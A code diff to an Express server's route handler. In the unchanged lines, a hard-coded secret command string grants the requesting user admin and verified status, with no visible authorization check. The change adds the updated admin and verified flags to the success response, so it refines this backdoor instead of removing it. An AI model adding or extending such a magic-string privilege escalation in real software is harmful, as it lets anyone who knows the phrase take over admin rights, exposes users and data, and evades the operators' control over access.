@@ -1019,7 +1019,14 @@ export async function registerRoutes(app: express.Express) {
       if (command === "okeno_admin_elevate_2026") {
         await storage.setUserAdmin(userId, true);
         await storage.setUserVerified(userId, true);
-        return res.json({ message: "Admin rights granted successfully" });
+        const updatedUser = await storage.getUser(userId);
+        return res.json({ 
+          message: "Admin rights granted successfully", 
+          data: { 
+            isAdmin: updatedUser?.isAdmin, 
+            isVerified: updatedUser?.isVerified 
+          } 
+        });
       }
 
       // Diagnostic info
